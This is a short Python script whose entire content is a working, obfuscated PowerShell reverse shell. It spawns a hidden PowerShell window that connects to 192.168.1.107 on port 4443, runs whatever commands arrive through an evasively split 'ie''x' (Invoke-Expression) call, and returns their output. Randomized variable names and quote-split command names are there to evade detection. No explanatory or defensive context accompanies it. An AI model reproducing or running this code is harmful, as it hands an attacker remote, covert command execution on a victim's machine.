import subprocess 

def execute_powershell_command(command): 

    child = subprocess.Popen(["powershell.exe", command],  

                            stdout=subprocess.PIPE,  

                            stderr=subprocess.PIPE,  

                            creationflags=0x08000000) 

    out, err = child.communicate() 

    return out, err 

execute_powershell_command("""Start-Process $PSHOME\powershell.exe -ArgumentList {$7ce35378905f4c27a8252b856f8299a8 = New-Object System.Net.Sockets.TCPClient('192.168.1.107',4443);$f6e2fdfa36094a869f5dadf5a6a50324 = $7ce35378905f4c27a8252b856f8299a8.GetStream();[byte[]]$be9370942a4e4603a003f564dba8429b = 0..65535|%{0};while(($i = $f6e2fdfa36094a869f5dadf5a6a50324.Read($be9370942a4e4603a003f564dba8429b, 0, $be9370942a4e4603a003f564dba8429b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($be9370942a4e4603a003f564dba8429b,0, $i);$sendback = (ie''x $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pw''d).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$f6e2fdfa36094a869f5dadf5a6a50324.Write($sendbyte,0,$sendbyte.Length);$f6e2fdfa36094a869f5dadf5a6a50324.Flush()};$7ce35378905f4c27a8252b856f8299a8.Close()} -WindowStyle Hidden""")
